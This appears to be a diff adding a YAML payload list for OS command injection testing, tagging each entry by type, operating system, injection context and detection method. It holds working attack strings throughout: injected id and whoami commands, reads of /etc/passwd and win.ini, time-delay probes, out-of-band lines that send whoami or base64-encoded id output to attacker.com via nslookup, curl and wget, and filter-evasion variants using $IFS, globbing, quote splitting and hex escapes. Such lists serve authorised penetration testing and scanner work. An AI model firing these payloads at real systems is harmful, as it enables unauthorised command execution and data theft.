@@ -1,0 +1,246 @@
+# OS Command Injection Payloads with Metadata
+# Usage: Filter by type, os, or context for targeted testing
+
+payloads:
+  # Basic injection - semicolon
+  - payload: ";id"
+    type: basic
+    os: [linux, macos]
+    context: [user-input, URL-parameter]
+    detection: error-based
+
+  - payload: ";whoami"
+    type: basic
+    os: [linux, macos, windows]
+    context: [user-input, URL-parameter]
+    detection: error-based
+
+  - payload: ";uname -a"
+    type: basic
+    os: [linux, macos]
+    context: [user-input, URL-parameter]
+    detection: error-based
+
+  - payload: "& dir"
+    type: basic
+    os: [windows]
+    context: [user-input, URL-parameter]
+    detection: error-based
+
+  - payload: "& whoami"
+    type: basic
+    os: [windows]
+    context: [user-input, URL-parameter]
+    detection: error-based
+
+  # Pipe injection
+  - payload: "|id"
+    type: basic
+    os: [linux, macos]
+    context: [user-input, URL-parameter, filename]
+    detection: error-based
+
+  - payload: "|cat /etc/passwd"
+    type: basic
+    os: [linux, macos]
+    context: [user-input, URL-parameter]
+    detection: error-based
+
+  - payload: "| type C:\\Windows\\win.ini"
+    type: basic
+    os: [windows]
+    context: [user-input, URL-parameter]
+    detection: error-based
+
+  # Backtick subshell
+  - payload: "`id`"
+    type: basic
+    os: [linux, macos]
+    context: [user-input, URL-parameter, filename]
+    detection: error-based
+
+  - payload: "`whoami`"
+    type: basic
+    os: [linux, macos]
+    context: [user-input, URL-parameter, filename]
+    detection: error-based
+
+  # $() subshell
+  - payload: "$(id)"
+    type: basic
+    os: [linux, macos]
+    context: [user-input, URL-parameter, filename]
+    detection: error-based
+
+  - payload: "$(whoami)"
+    type: basic
+    os: [linux, macos]
+    context: [user-input, URL-parameter, filename]
+    detection: error-based
+
+  - payload: "$(cat /etc/passwd)"
+    type: basic
+    os: [linux, macos]
+    context: [user-input, URL-parameter]
+    detection: error-based
+
+  # && chaining
+  - payload: "&& id"
+    type: chained
+    os: [linux, macos]
+    context: [user-input, URL-parameter]
+    detection: error-based
+
+  - payload: "&& whoami"
+    type: chained
+    os: [linux, macos, windows]
+    context: [user-input, URL-parameter]
+    detection: error-based
+
+  - payload: "|| id"
+    type: chained
+    os: [linux, macos]
+    context: [user-input, URL-parameter]
+    detection: error-based
+
+  # Newline injection
+  - payload: "%0aid"
+    type: basic
+    os: [linux, macos]
+    context: [URL-parameter, header]
+    detection: error-based
+
+  - payload: "%0d%0aid"
+    type: basic
+    os: [linux, macos]
+    context: [URL-parameter, header]
+    detection: error-based
+
+  - payload: "\\nid"
+    type: basic
+    os: [linux, macos]
+    context: [user-input, header]
+    detection: error-based
+
+  # Blind - time-based
+  - payload: ";sleep 5"
+    type: blind
+    os: [linux, macos]
+    context: [user-input, URL-parameter]
+    detection: time-delay
+
+  - payload: "|sleep 5"
+    type: blind
+    os: [linux, macos]
+    context: [user-input, URL-parameter]
+    detection: time-delay
+
+  - payload: "$(sleep 5)"
+    type: blind
+    os: [linux, macos]
+    context: [user-input, URL-parameter, filename]
+    detection: time-delay
+
+  - payload: "& ping -n 5 127.0.0.1"
+    type: blind
+    os: [windows]
+    context: [user-input, URL-parameter]
+    detection: time-delay
+
+  - payload: "& timeout /t 5"
+    type: blind
+    os: [windows]
+    context: [user-input, URL-parameter]
+    detection: time-delay
+
+  # Blind - DNS callback / OOB
+  - payload: ";nslookup attacker.com"
+    type: blind
+    os: [linux, macos, windows]
+    context: [user-input, URL-parameter]
+    detection: DNS-callback
+
+  - payload: "$(nslookup $(whoami).attacker.com)"
+    type: blind
+    os: [linux, macos]
+    context: [user-input, URL-parameter]
+    detection: DNS-callback
+
+  - payload: ";curl http://attacker.com/$(whoami)"
+    type: blind
+    os: [linux, macos]
+    context: [user-input, URL-parameter]
+    detection: DNS-callback
+
+  - payload: "|wget http://attacker.com/$(id|base64)"
+    type: blind
+    os: [linux]
+    context: [user-input, URL-parameter]
+    detection: DNS-callback
+
+  # Filter bypass - space bypass with $IFS
+  - payload: ";cat${IFS}/etc/passwd"
+    type: filter-bypass
+    os: [linux, macos]
+    context: [user-input, URL-parameter]
+    bypass_type: space-bypass
+    detection: error-based
+
+  - payload: ";{cat,/etc/passwd}"
+    type: filter-bypass
+    os: [linux, macos]
+    context: [user-input, URL-parameter]
+    bypass_type: space-bypass
+    detection: error-based
+
+  - payload: ";cat$IFS/etc/passwd"
+    type: filter-bypass
+    os: [linux, macos]
+    context: [user-input, URL-parameter]
+    bypass_type: space-bypass
+    detection: error-based
+
+  # Filter bypass - path bypass with wildcards / glob
+  - payload: "/???/??t /???/??ss??"
+    type: filter-bypass
+    os: [linux, macos]
+    context: [user-input, URL-parameter]
+    bypass_type: path-bypass
+    detection: error-based
+
+  - payload: "/???/??n/??rl http://attacker.com"
+    type: filter-bypass
+    os: [linux, macos]
+    context: [user-input, URL-parameter]
+    bypass_type: path-bypass
+    detection: DNS-callback
+
+  # Filter bypass - quote bypass
+  - payload: ";w'h'o'a'm'i"
+    type: filter-bypass
+    os: [linux, macos]
+    context: [user-input, URL-parameter]
+    bypass_type: quote-bypass
+    detection: error-based
+
+  - payload: ";w\"h\"o\"a\"m\"i"
+    type: filter-bypass
+    os: [linux, macos]
+    context: [user-input, URL-parameter]
+    bypass_type: quote-bypass
+    detection: error-based
+
+  - payload: ";$'\\x77\\x68\\x6f\\x61\\x6d\\x69'"
+    type: filter-bypass
+    os: [linux, macos]
+    context: [user-input, URL-parameter]
+    bypass_type: hex-bypass
+    detection: error-based
+
+  # Wildcard bypass
+  - payload: ";/bin/ca? /etc/pas?wd"
+    type: filter-bypass
+    os: [linux, macos]
+    context: [user-input, URL-parameter]
+    bypass_type: wildcard-bypass
+    detection: error-based
